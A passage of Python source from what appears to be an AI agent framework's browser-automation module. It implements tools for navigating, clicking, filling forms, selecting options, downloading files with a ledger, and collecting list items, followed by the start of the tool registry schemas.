            return f"⚠️ Snapshot failed: {type(e).__name__}: {e}"
        try:
            containers = await _run_in_session(
                session, "detect_scrollable_containers",
            )
        except Exception:
            containers = []
    css_hints = _format_scrollable_hints(containers)
    if raw:
        return tree + css_hints
    summarized = await _maybe_summarize_snapshot(tree, ctx, agent_id)
    return summarized + css_hints


async def browser_navigate(ctx: ToolContext, url: str) -> str:
    """Navigate the active browser session to URL within the auth
    domains. Returns the post-navigation accessibility snapshot,
    prefixed with the HTTP status when the server answered 4xx/5xx —
    a 404 renders as an ordinary page, so without this the agent
    cannot tell a missing page from a real one and waits out full
    click timeouts on elements that were never there."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            snapshot = await _run_in_session(session, "navigate", url)
        except ValueError as e:
            return f"⚠️ Domain blocked: {e}"
        except Exception as e:
            log.warning(
                "navigate failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Navigate failed: {type(e).__name__}: {e}"
    status_note = ""
    if snapshot.startswith(HTTP_ERROR_PREFIX):
        head, _, snapshot = snapshot.partition("\n\n")
        status_note = f"{head}\n\n"
    summarized = await _maybe_summarize_snapshot(snapshot, ctx, agent_id)
    if summarized:
        return f"Navigated to {url}\n\n{status_note}{summarized}"
    if status_note:
        return f"Navigated to {url}\n\n{status_note.strip()}"
    return f"Navigated to {url}"


async def browser_scroll(
    ctx: ToolContext, direction: str = "down", amount: int = 500,
) -> str:
    """Scroll the active page up or down by a pixel amount."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            await _run_in_session(session, "scroll", direction, amount)
        except Exception as e:
            log.warning(
                "scroll failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Scroll failed: {type(e).__name__}: {e}"
    return f"Scrolled {direction} by {amount}px"


async def browser_click(
    ctx: ToolContext, ref_or_selector: str, timeout: int = 30000,
) -> str:
    """Click an element by @eN ref (from last snapshot) or CSS selector."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            outcome = await _run_in_session(
                session, "click", ref_or_selector, timeout,
            )
        except ValueError as e:
            return f"⚠️ {e}"
        except Exception as e:
            log.warning(
                "click failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            # First line only: Playwright appends a call log dozens of lines
            # long, and what the agent needs after it is the probes.
            diagnosis = getattr(e, _CLICK_DIAGNOSIS_ATTR, None) or {}
            lines = [
                f"⚠️ Click failed: {type(e).__name__}: "
                f"{_one_line(str(e).split(chr(10))[0])}"
            ]
            if diagnosis.get("starved"):
                lines.append(_WINDOW_NOT_PAINTED)
            lines.extend(_probe_answer_lines(diagnosis.get("probes")))
            return "\n".join(lines)
    if isinstance(outcome, dict) and outcome.get("delivery") == _CLICK_DELIVERY_EVENT:
        return (
            f"Clicked {ref_or_selector} (as a DOM event; window not painted).\n"
            f"{_WINDOW_NOT_PAINTED}"
        )
    return f"Clicked {ref_or_selector}"


async def browser_fill(
    ctx: ToolContext, ref_or_selector: str, text: str,
) -> str:
    """Fill an input element by @eN ref or CSS selector with text."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            await _run_in_session(session, "fill", ref_or_selector, text)
        except ValueError as e:
            return f"⚠️ {e}"
        except Exception as e:
            log.warning(
                "fill failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Fill failed: {type(e).__name__}: {e}"
    return f"Filled {ref_or_selector} ({len(text)} chars)"


def _select_url_sentence(result: dict) -> str:
    if result.get("navigated"):
        return f"The page URL changed to {_one_line(result.get('url_after') or '')}."
    return "The page URL did not change."


def _select_option_list(result: dict) -> str:
    """The options an ordinary select holds, so a misread label costs one
    call and not a second snapshot. Never reached for a withheld select —
    its options are not in `result` at all."""
    options = result.get("options") or []
    shown = [
        f'"{_one_line(str(o.get("label") or ""), _SELECT_OPTION_LIMIT)}"'
        f' (value "{_one_line(str(o.get("value") or ""), _SELECT_OPTION_LIMIT)}")'
        + (", disabled" if o.get("disabled") else "")
        for o in options[:_SELECT_OPTIONS_SHOWN]
    ]
    more = len(options) - len(shown)
    tail = f", and {more} more" if more > 0 else ""
    return "; ".join(shown) + tail


def _select_answer(ref: str, result: dict) -> str:
    """What was selected and whether the page moved — and for a select the
    snapshot withholds, neither the option nor its siblings."""
    status = (result or {}).get("status")
    secret = bool((result or {}).get("secret"))
    if status == "not_a_select":
        tag = result.get("tag") or "unknown element"
        return (
            f"⚠️ {ref} is a <{tag}>, not a <select>, and nothing was changed. "
            f"browser_select drives native selects only — browser_fill types "
            f"into a text field, browser_click presses a button or a link and "
            f"opens a dropdown built from divs."
        )
    if status == "select_disabled":
        return f"⚠️ The select {ref} is disabled; nothing was changed."
    if status == "multiple":
        return (
            f"⚠️ {ref} is a <select multiple>; nothing was changed. "
            f"browser_select sets one option and does not drive multi-selects."
        )
    if status == "option_disabled":
        return (
            f'⚠️ The option "{_one_line(result.get("label") or "", _SELECT_OPTION_LIMIT)}"'
            f' (value "{_one_line(result.get("value") or "", _SELECT_OPTION_LIMIT)}")'
            f" in {ref} is disabled; nothing was changed."
        )
    if status == "no_such_option":
        if secret:
            return (
                f"⚠️ Nothing was selected: {ref} has no enabled option "
                f"matching what you named. This select is a secret field, so "
                f"its options are not listed here; it has "
                f"{result.get('option_count', 0)} of them."
            )
        return (
            f"⚠️ Nothing was selected: {ref} has no option whose "
            f"{result.get('by')} is "
            f'"{_one_line(str(result.get("named")), _SELECT_OPTION_LIMIT)}". '
            f"Its options are: {_select_option_list(result)}."
        )
    if status == "failed":
        return (
            f"⚠️ Nothing was selected: "
            f"{_one_line(result.get('reason') or 'unknown')}"
        )
    if secret:
        return (
            f"Selected the option you named in {ref}. This select is a secret "
            f"field, so its label, its value and its other options are "
            f"withheld. {_select_url_sentence(result)}"
        )
    label = _one_line(result.get("label") or "", _SELECT_OPTION_LIMIT)
    value = _one_line(result.get("value") or "", _SELECT_OPTION_LIMIT)
    named = f'"{label}" (value "{value}")' if label else f'value "{value}"'
    return f"Selected {named} in {ref}. {_select_url_sentence(result)}"


async def browser_select(
    ctx: ToolContext,
    ref_or_selector: str,
    value: Optional[str] = None,
    label: Optional[str] = None,
    index: Optional[int] = None,
) -> str:
    """Choose one option of a native <select> by its value, its visible label
    or its 0-based index. Answers with the option now selected and whether the
    page URL changed; it does not submit the form."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    named_by = {"value": value, "label": label, "index": index}
    given = [name for name in _SELECT_CRITERIA if named_by[name] is not None]
    if len(given) != 1:
        return (
            "⚠️ Give exactly one of value, label or index — "
            + ("none was given" if not given else f"{' and '.join(given)} were given")
            + ". value is the option's value attribute, label its visible "
            "text, index its 0-based position among all the options."
        )
    by = given[0]
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            result = await _run_in_session(
                session, "select", ref_or_selector, by, named_by[by],
            )
        except ValueError as e:
            return f"⚠️ {e}"
        except Exception as e:
            log.warning(
                "select failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Select failed: {type(e).__name__}: {e}"
    return _select_answer(ref_or_selector, result)


async def browser_wait_for(
    ctx: ToolContext, ref_or_selector: str, timeout: int = 30000,
) -> str:
    """Wait for an element by @eN ref or CSS selector to become visible."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            await _run_in_session(
                session, "wait_for", ref_or_selector, timeout,
            )
        except ValueError as e:
            return f"⚠️ {e}"
        except Exception as e:
            log.warning(
                "wait failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Wait failed: {type(e).__name__}: {e}"
    return f"Element {ref_or_selector} is visible"


async def browser_extract(ctx: ToolContext, save_to: Optional[str] = None) -> str:
    """Return the current page's full HTML (fallback inspection
    surface when the accessibility tree is insufficient)."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            html = await _run_in_session(session, "extract")
        except Exception as e:
            log.warning(
                "extract failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Extract failed: {type(e).__name__}: {e}"
    saved_to, save_warning = _save_page_markdown(ctx, save_to, html)
    return f"{_extract_header(len(html), saved_to, save_warning)}\n\n{html}"


def _extract_header(
    total: int, saved_to: Optional[str], save_warning: Optional[str],
) -> str:
    """Say how much HTML this is, and where the rest of it went.

    Raw HTML is the largest thing any of these tools returns and it went back
    with no size and no continuation at all, so a page of half a million
    characters arrived as fifteen thousand with nothing to say the difference.
    """
    from ..loop import TOOL_RESULT_CHAR_CAP

    parts = [f"[browser_extract | {total} chars of HTML"]
    if save_warning:
        parts.append(save_warning)
    if saved_to:
        parts.append(
            f"saved: all {total} chars written to {saved_to} — read it with"
            f" read_file(path, offset=, limit=)"
        )
    elif total > TOOL_RESULT_CHAR_CAP:
        parts.append(
            f"a tool result is cut at {TOOL_RESULT_CHAR_CAP} chars before it reaches"
            f" you — pass save_to='page.html' to keep the rest"
        )
    return " | ".join(parts) + "]"


async def browser_screenshot(
    ctx: ToolContext, full_page: bool = False,
) -> str:
    """Capture a screenshot of the active page. Saves PNG under the
    agent's screenshots/ directory with an LRU cap of 50 files."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    screenshots_dir = ctx.agent_root / "screenshots"
    screenshots_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    path = screenshots_dir / f"{ts}.png"
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            await _run_in_session(
                session, "screenshot", full_page, str(path),
            )
        except Exception as e:
            log.warning(
                "screenshot failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Screenshot failed: {type(e).__name__}: {e}"
    try:
        _cleanup_screenshots_lru(screenshots_dir, max_keep=50)
    except Exception:
        pass
    try:
        rel = path.relative_to(ctx.agent_root)
        return f"Saved screenshot to {rel}"
    except ValueError:
        return f"Saved screenshot to {path}"


_DOWNLOAD_DIR_DEFAULT = "downloads"
_DOWNLOAD_NOTE_LIMIT = 300


def _resolve_download_dir(ctx: ToolContext, directory: str) -> Path:
    """Where a download may land: the resolver every other file tool uses, so
    a grant and a refusal read the same here as there."""
    from .core import _resolve_file_path

    target = _resolve_file_path(
        ctx, directory or _DOWNLOAD_DIR_DEFAULT, require_write=True,
    )
    if target.exists() and not target.is_dir():
        raise NotADirectoryError(f"{directory!r} is a file, not a directory")
    target.mkdir(parents=True, exist_ok=True)
    return target


def _append_download_record(directory: Path, record: dict) -> Optional[str]:
    """One JSON line per saved file, in the directory the files are in.

    Beside the files rather than in the agent's state, so a folder copied
    elsewhere still says where each file came from. Returns None, or the
    reason the line was not written — a ledger that failed must not cost the
    file it describes.
    """
    try:
        with open(
            directory / DOWNLOAD_LEDGER_NAME, "a", encoding="utf-8",
        ) as fh:
            fh.write(json.dumps(record, ensure_ascii=False) + "\n")
        return None
    except Exception as exc:
        log.warning("download ledger write failed in %s: %s", directory, exc)
        return f"{type(exc).__name__}: {exc}"


def _download_ledger_tally(directory: Path) -> Tuple[int, int]:
    """(records, records dated today in UTC). Some sites meter downloads and
    charge for each, and that charge cannot be given back, so the count is
    part of the answer rather than something to go and look up."""
    total = 0
    today_count = 0
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    try:
        text = (directory / DOWNLOAD_LEDGER_NAME).read_text(encoding="utf-8")
    except OSError:
        return 0, 0
    for line in text.splitlines():
        if not line.strip():
            continue
        total += 1
        try:
            saved_at = json.loads(line).get("saved_at", "")
        except ValueError:
            continue
        if str(saved_at).startswith(today):
            today_count += 1
    return total, today_count


def _probe_answer_lines(probes: Optional[List[str]]) -> List[str]:
    """The probe outcomes, one per line, under a heading that says js_click
    acted.

    That last probe is also a press that got through, so an agent reading
    "js_click: passed" must not be left thinking the page stood still."""
    if not probes:
        return []
    return [
        "The click never reached the page; js_click below is also an "
        "attempt, so a pass there may have acted on it:"
    ] + [f"  {line}" for line in probes[:3]]


def _download_answer(
    ctx: ToolContext, directory: Path, result: dict, note: str,
) -> str:
    """The saved file stated as what it is, then where it came from, then
    what the ledger in that directory now holds."""
    status = (result or {}).get("status")
    if status == "no_download":
        waited = int((result.get("timeout_ms") or 0) / 1000)
        before = _one_line(result.get("url_before") or "<unknown>")
        now = _one_line(result.get("page_url") or "<unknown>")
        tabs = int(result.get("tab_count") or 0)
        # Facts only. The sentence that used to stand here guessed the element
        # was an ordinary link; on the live run the button was the right one
        # and the network was down, so the guess cost a turn.
        moved = before != now
        lines = [
            f"No download started within {waited}s of the click "
            f"({result.get('error', 'TimeoutError')}).",
            f"The page was {before} before the click and is {now} now — "
            f"{'the URL changed' if moved else 'the URL did not change'}.",
            f"The browser context has {tabs} tab(s).",
        ]
        # What to do next, from the one fact that separates the two cases.
        lines.append(
            "The page advanced: take a fresh browser_snapshot and run "
            "browser_download on the link the new page offers."
            if moved else
            "The page did not move: a fresh browser_snapshot and the same "
            "click again is the move that has worked here."
        )
        if result.get("window_not_painted"):
            lines.append(_WINDOW_NOT_PAINTED)
        lines.extend(_probe_answer_lines(result.get("probes")))
        # What the page itself offers off its own host — a site's own fallback
        # link is the usual answer to a button that starts nothing. A page
        # that could not be asked (None) says nothing rather than claiming it
        # carries none.
        links = result.get("cross_host_links")
        if links:
            named = "; ".join(
                f'"{link.get("text") or ""}" -> {link.get("href") or ""}'
                for link in links
            )
            lines.append(f"Links on this page to other hosts: {named}")
        elif links is not None:
            lines.append("This page has no links to other hosts.")
        lines.append(
            "timeout_seconds bounds the wait for a download to START, not the "
            "transfer that follows: raising it helps only when the site is "
            "slow to begin one."
        )
        return "\n".join(lines)
    if status == "too_large":
        return (
            f"⚠️ Refused: the file is {result['size']:,} bytes, over the "
            f"{result['max_bytes']:,}-byte cap. Nothing was saved and nothing "
            f"was recorded."
        )
    if status == "failed":
        return (
            f"⚠️ The download did not finish: "
            f"{_one_line(result.get('reason') or 'unknown')}. Nothing was "
            f"saved and nothing was recorded."
        )

    path = Path(result["path"])
    try:
        shown = path.relative_to(ctx.agent_root).as_posix()
    except ValueError:
        shown = str(path)
    detected = result.get("detected_type", "unknown")

    lines: List[str] = []
    if result.get("type_mismatch"):
        # First line, because the model plans on this: a login page under a
        # `.pdf` name is not the file that was asked for.
        claimed = path.suffix.lstrip(".") or "no extension"
        if detected == "html":
            lines.append(
                f"⚠️ This is an HTML page, not a file — the bytes say html, "
                f"the name says .{claimed}. Kept as evidence at {shown}; do "
                f"not count it as what you asked for."
            )
        else:
            lines.append(
                f"⚠️ The bytes say {detected}, the name says .{claimed} — kept "
                f"at {shown}, but it is not what its name claims."
            )
    lines.append(
        f"Saved {shown} — {detected}, {result['size']:,} bytes, "
        f"sha256 {result['sha256']}"
    )
    lines.append(
        f'The site suggested the name "{_one_line(result.get("suggested") or "")}"'
    )
    if result.get("source_url"):
        lines.append(f"It came from {_one_line(result['source_url'])}")
    if result.get("started_by"):
        lines.append(
            f"The click itself never reached the page — the "
            f"{result['started_by']} probe started this download."
        )
    if result.get("window_not_painted"):
        lines.append(
            "The click was delivered as a DOM event. " + _WINDOW_NOT_PAINTED
        )
    if note:
        lines.append(f"Your note: {note}")

    record = {
        "saved_at": datetime.now(timezone.utc).isoformat(),
        "saved_path": shown,
        "bytes": result["size"],
        "sha256": result["sha256"],
        "detected_type": detected,
        "suggested_filename": result.get("suggested") or "",
        "url": result.get("source_url") or "",
        "page_url": result.get("page_url") or "",
        "page_title": _one_line(result.get("page_title") or ""),
        "note": note,
    }
    ledger_error = _append_download_record(directory, record)
    if ledger_error:
        lines.append(
            f"⚠️ The file is saved, but {DOWNLOAD_LEDGER_NAME} could not be "
            f"written: {ledger_error}"
        )
    total, today = _download_ledger_tally(directory)
    lines.append(
        f"{DOWNLOAD_LEDGER_NAME} in that folder now holds {total} record(s), "
        f"{today} of them saved today (UTC)."
    )
    return "\n".join(lines)


async def browser_download(
    ctx: ToolContext,
    ref_or_selector: str,
    directory: str = _DOWNLOAD_DIR_DEFAULT,
    timeout_seconds: int = _DOWNLOAD_TIMEOUT_DEFAULT,
    note: str = "",
) -> str:
    """Click an element and save the file it downloads into the agent's
    sandbox, or into an extended path the firewall grants it. Answers with
    where it landed, what the bytes say it is, its size and its sha256 —
    never its content."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    try:
        target_dir = _resolve_download_dir(ctx, directory)
    except (PermissionError, ValueError, OSError) as e:
        return f"⚠️ Download directory refused: {e}"
    timeout_ms = max(1, min(int(timeout_seconds), _DOWNLOAD_TIMEOUT_MAX)) * 1000
    note = _one_line(note or "", _DOWNLOAD_NOTE_LIMIT)
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            result = await _run_in_session(
                session, "download",
                ref_or_selector, str(target_dir), timeout_ms,
                _timeout=timeout_ms / 1000 + _DOWNLOAD_SAVE_TIMEOUT_SEC,
            )
        except ValueError as e:
            return f"⚠️ {e}"
        except Exception as e:
            log.warning(
                "download failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Download failed: {type(e).__name__}: {e}"
    return _download_answer(ctx, target_dir, result, note)


async def browser_switch_tab(ctx: ToolContext, index: int) -> str:
    """Switch the active page to tab at `index` in the browser
    context (0-based)."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            new_page = await _run_in_session(session, "switch_tab", index)
        except Exception as e:
            log.warning(
                "switch tab failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Switch tab failed: {type(e).__name__}: {e}"
    try:
        url = new_page.url
    except Exception:
        url = "<unknown>"
    return f"Switched to tab {index} ({url})"


COLLECT_LIMIT_DEFAULT = 40
COLLECT_LIMIT_MAX = 200
# What the header, the window line and the next-call hint need, so the items
# get the rest of the tool-result cap instead of being cut by it.
_COLLECT_ANSWER_MARGIN = 3000
_COLLECT_TEXT_LIMIT = 300


def _collect_item_line(number: int, item: dict) -> str:
    """One item on one line, its link first.

    The link leads because it is the part that cannot be recovered: a shape
    that printed each item's text above its own link lost every link below a
    cut and kept every title, which reads as a complete list of titles.
    """
    fields: List[str] = []
    href = str(item.get("href") or "")
    if href:
        fields.append(href)
    text = _one_line(str(item.get("text") or ""), _COLLECT_TEXT_LIMIT)
    if text:
        fields.append(text)
    for key, value in item.items():
        if key in ("href", "text"):
            continue
        fields.append(f"{key}={_one_line(str(value), _COLLECT_TEXT_LIMIT)}")
    return f"{number}. " + " | ".join(fields)


def _collect_window(
    items: List[dict], offset: int, limit: int, budget: int,
) -> Tuple[List[str], int]:
    """The lines that fit, and the offset the next call starts at.

    Two bounds: `limit` is what the caller asked for, `budget` is what a tool
    result can carry — so a page of long titles returns fewer items rather
    than a window something downstream cuts. At least one line always comes
    back, otherwise a single oversized item would stall the walk.
    """
    lines: List[str] = []
    spent = 0
    index = offset
    while index < len(items) and len(lines) < limit:
        line = _collect_item_line(index + 1, items[index])
        if lines and spent + len(line) + 1 > budget:
            break
        lines.append(line)
        spent += len(line) + 1
        index += 1
    return lines, index


def _collect_window_line(
    items: List[dict], offset: int, next_offset: int, limit: int,
    container: str, item_selector: str, cap: int,
) -> str:
    """Which items these are, out of how many, and the call that gets the
    rest. Stated always: an answer that shows part of a list and says nothing
    is read as the whole list."""
    held = len(items)
    if not held:
        return "No items to show."
    if offset >= held:
        return (
            f"offset={offset} is past the end — items 1–{held} of {held} are "
            f"in hand; call again with a smaller offset."
        )
    line = f"items {offset + 1}–{next_offset} of {held}"
    shown = next_offset - offset
    if shown < min(limit, held - offset):
        line += (
            f" (this window stopped at {shown} items to stay under the "
            f"{cap}-char tool-result cap)"
        )
    if next_offset < held:
        line += (
            f" — {held - next_offset} more; next: browser_collect("
            f'container="{container}", item_selector="{item_selector}", '
            f"offset={next_offset})"
        )
    else:
        line += " — this is the last window"
    return line


async def browser_collect(
    ctx: ToolContext,
    container: str,
    item_selector: str,
    extract: list[str] | None = None,
    max_scrolls: int = 30,
    scroll_pause_ms: int = 1000,
    dedup_by: str = "text",
    offset: int = 0,
    limit: int | None = None,
) -> str:
    """Scroll a container and collect all matching items via CSS selectors.
    Returns one line per item, the link first, in windows of `limit` starting
    at `offset`, and always says which items those are out of how many."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            result = await _run_in_session(
                session, "collect",
                container, item_selector, extract or ["text"],
                max_scrolls, scroll_pause_ms, dedup_by,
            )
        except Exception as e:
            log.warning(
                "collect failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Collect failed: {type(e).__name__}: {e}"
    from ..loop import TOOL_RESULT_CHAR_CAP as cap
    if isinstance(result, dict) and result.get("error"):
        return f"⚠️ {result['error']}"
    total = result.get("total", 0)
    scrolls = result.get("scrolls_done", 0)
    header = f"Collected {total} items ({scrolls} scrolls)"
    # Say which of the three exits happened. "Collected 120 items (30 scrolls)"
    # read the same whether the list had ended or the budget had, and only one
    # of those means the collection is complete.
    reason = result.get("stop_reason")
    if reason == "list_exhausted":
        header += " — list exhausted, this is the whole list"
    elif reason == "scroll_budget_exhausted":
        idle = result.get("consecutive_empty") or 0
        if idle:
            header += (
                f" — stopped at the max_scrolls={result.get('max_scrolls', scrolls)} budget,"
                f" and the last {idle} scroll(s) added nothing: the page may have no more"
                " to load, in which case raising max_scrolls changes nothing"
            )
        else:
            header += (
                f" — INCOMPLETE: stopped at the max_scrolls={result.get('max_scrolls', scrolls)}"
                " budget while the list was still growing; raise max_scrolls to collect more"
            )
    elif reason:
        header += f" — INCOMPLETE: scrolling stopped early ({reason})"
    if result.get("warning"):
        header += f"\n⚠️ {result['warning']}"

    items = result.get("items") or []
    offset = max(0, int(offset or 0))
    limit = (
        COLLECT_LIMIT_DEFAULT if limit is None
        else max(1, min(int(limit), COLLECT_LIMIT_MAX))
    )
    lines, next_offset = _collect_window(
        items, offset, limit, cap - _COLLECT_ANSWER_MARGIN,
    )
    window = _collect_window_line(
        items, offset, next_offset, limit, container, item_selector, cap,
    )
    body = "\n".join(lines)
    return f"{header}\n{window}\n\n{body}" if body else f"{header}\n{window}"


async def browser_close(ctx: ToolContext) -> str:
    """Close the active browser session and free Camoufox resources."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            await _run_in_session(session, "close")
        except Exception as e:
            log.warning(
                "close failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
            return f"⚠️ Close failed: {type(e).__name__}: {e}"
    _session_locks.pop(agent_id, None)
    answer = "Browser session closed"
    # The close-time snapshot is the last one a window gets, so a refusal
    # here is the person's last chance to hear about it. This is the close
    # with a tool result to say it in; a close nobody asked for (idle sweep,
    # window gone) has only the audit row.
    declined = getattr(session, "_last_writeback_decline", None)
    if declined:
        answer += _sign_in_not_saved_notice(session._etld1 or "", declined)
    return answer


def get_tools() -> List[ToolEntry]:
    """Export browser tools for registry."""
    # The descriptions state the cap a tool result is trimmed to. Quoted as a
    # literal they would go on saying 15000 after the cap moved, and a tool
    # description is what the model plans against.
    from ..loop import TOOL_RESULT_CHAR_CAP as cap

    return [
        ToolEntry(
            name="browse_page",
            schema={
                "name": "browse_page",
                "description": f"Fetch a web page and extract content as structured markdown. Preserves headings, lists, tables, and links. Use size presets to control output length: s=5K, m=10K (default), l=25K, f=full. A tool result is cut again at {cap} chars before it reaches you, so for a long page pass save_to=<filename>: the whole markdown is written there and read_file(offset=, limit=) pages through it. Set use_auth=<domain> to fetch authenticated content using the cookies stored for that site. Set keep_open=true for a VISIBLE browser window: it opens with whatever cookies are stored, goes anywhere, and whatever it ends up holding for that site is saved as it goes — a window left part-way through a sign-in saves what it has, which is the site's anonymous cookies. The one write that is refused is a snapshot holding nothing usable for the site, so a stored session is never replaced by nothing; the set it displaced is kept one generation back. Without keep_open the fetch runs in a background browser that reaches only the site and the hosts its manifest names, and it is refused outright when no session is stored — because a login page fetched into a window nobody can see helps nobody. When a visible page asks for a sign-in, say so in the chat and wait for the person.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "URL to fetch"
                        },
                        "size": {
                            "type": "string",
                            "description": "Output size preset: s (5K summary), m (10K default), l (25K deep), f (full)",
                            "default": "m",
                            "enum": ["s", "m", "l", "f"]
                        },
                        "use_auth": {
                            "type": "string",
                            "description": "Optional auth domain (eg 'example.com'). When set, the page is fetched using the cookies stored for that site in the agent's encrypted vault. The URL must be within the same eTLD+1 as use_auth (subdomains allowed). Without keep_open the call is refused when no session is stored for the site."
                        },
                        "keep_open": {
                            "type": "boolean",
                            "description": "When true, the page loads in a VISIBLE Camoufox window that stays open after the fetch returns, and that window is ungated — it may follow the site wherever it goes, including to identity providers, because a person can see it. Works on both the anonymous and use_auth paths, and the same window is reused by later keep_open calls and by the browser_* tools for this agent. Use it whenever a site may ask for a sign-in: the person logs in there by hand while you wait, and their session is stored as they do it. Window stays open until DPC restart, an explicit browser_close call, or the person closes it.",
                            "default": False
                        },
                        "verify": {
                            "type": "boolean",
                            "description": "When true, also render the page in a real browser and report how many characters JS produced against the static fetch. Costs a browser launch (~7-10s). Use when the response says the page runs JS and you need to know whether anything is missing — a static fetch cannot establish that a page has no more content.",
                            "default": False
                        },
                        "save_to": {
                            "type": "string",
                            "description": "Write the page's whole markdown to this file (relative names land in the agent sandbox) and name it in the header. The answer's body is unchanged — the file is the part that survives the tool-result cap, and read_file reads it with offset/limit. Use it for anything long enough that the size preset or the cap would cut."
                        }
                    },
                    "required": ["url"]
                }
            },
            handler=browse_page,
            # 60s is too tight for the use_auth path: that goes through
            # Camoufox launch + goto (wait_until=domcontentloaded, ~2s typical,
            # 60s cap) + _wait_for_content_stable (10s, non-fatal) + optional
            # T9 popup-fallback (5min user-interaction timeout per Q4) +
            # trafilatura conversion. Worst case: ~5min popup + 30s
            # Camoufox + small overhead. 360s gives a 30s buffer over the
            # 5-min popup deadline so the user always has the full 5 min.
            # Anonymous browse_page (without use_auth) returns in <10s so
            # the higher cap doesn't slow that path down.
            timeout_sec=360,
            default_enabled=False,
        ),

        ToolEntry(
            name="fetch_json",
            schema={
                "name": "fetch_json",
                "description": (
                    "Fetch JSON data from a URL API endpoint. Documents larger"
                    " than 10000 characters come back one window at a time; the"
                    " response states the total size and the offset of the next"
                    " window. Each window is a fresh request to the server."
                ),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "URL to fetch JSON from"
                        },
                        "offset": {
                            "type": "integer",
                            "description": (
                                "First character of the document to return"
                                " (default 0). Use the offset the previous"
                                " response named to read the next window."
                            )
                        },
                        "limit": {
                            "type": "integer",
                            "description": (
                                "Characters to return in this window"
                                " (default 10000)."
                            )
                        }
                    },
                    "required": ["url"]
                }
            },
            handler=fetch_json,
            timeout_sec=30,
            default_enabled=False,
        ),


        ToolEntry(
            name="check_url",
            schema={
                "name": "check_url",
                "description": "Check if a URL is accessible and measure response time",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "URL to check"
                        }
                    },
                    "required": ["url"]
                }
            },
            handler=check_url,
            timeout_sec=15,
            default_enabled=False,
        ),

        ToolEntry(
            name="search_web",
            schema={
                "name": "search_web",
                "description": "Search the web using multiple engines (duckduckgo, bing, brave, google, yandex, mojeek, yahoo, wikipedia). Returns title + URL + snippet for each result. Use backend='auto' for automatic fallback across engines.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": {
                            "type": "string",
                            "description": "Search query"
                        },
                        "max_results": {
                            "type": "integer",
                            "description": "Maximum number of results",
                            "default": 5,
                            "minimum": 1,
                            "maximum": 20
                        },
                        "backend": {
                            "type": "string",
                            "description": "Search backend: auto, duckduckgo, bing, brave, google, yandex, mojeek, yahoo, wikipedia",
                            "default": "auto"
                        }
                    },
                    "required": ["query"]
                }
            },
            handler=search_web_ddgs,
            timeout_sec=30,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_snapshot",
            schema={
                "name": "browser_snapshot",
                "description": "Return the current page's accessibility-tree snapshot annotated with @eN ref IDs on every interactive element. Primary inspection surface for the agent — pass refs back to browser_click / browser_fill / browser_wait_for. Snapshots above the agent's configured threshold are summarized via the agent's snapshot summarization LLM (falls back to line-based truncation). Set raw=true to skip summarization and return the full unsummarized tree (useful for large lists where summarization loses items).",
                "parameters": {
